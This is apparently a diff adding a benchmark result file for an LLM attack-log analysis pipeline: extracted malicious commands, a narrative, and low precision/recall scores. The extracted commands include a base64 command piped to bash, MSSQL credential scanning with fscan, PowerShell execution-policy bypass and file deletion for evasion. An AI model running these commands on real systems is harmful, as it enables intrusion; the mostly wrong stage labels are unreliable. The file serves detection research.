@@ -1,0 +1,86 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuN6cuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c '/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/node'  -p '",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c 'echo start:454b7093-cc6e-484e-9c42-e222c6906204'",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c './sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C ...\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c 'mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456'",
+        "stage": "Collection"
+      },
+      {
+        "command": "./sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Persistence"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Persistence"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack begins with gaining an initial foothold through a base64-encoded command executed via VSCode Server. It uses a combination of persistent mechanisms like scheduled tasks and custom binaries to maintain long-term access. Remote execution capabilities and PowerShell are employed to gather information and communicate back to the attacker. Various defense evasion tactics such as deleting specific files are also observed.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49350,
+      "completion_tokens": 2662,
+      "total_tokens": 52012,
+      "wall_clock_s": 30.057,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1111111111111111,
+      "recall": 0.14285714285714285,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 8,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 9,
+      "fn": 7,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 49350,
+      "completion_tokens": 2662,
+      "total_tokens": 52012,
+      "wall_clock_s": 30.057,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
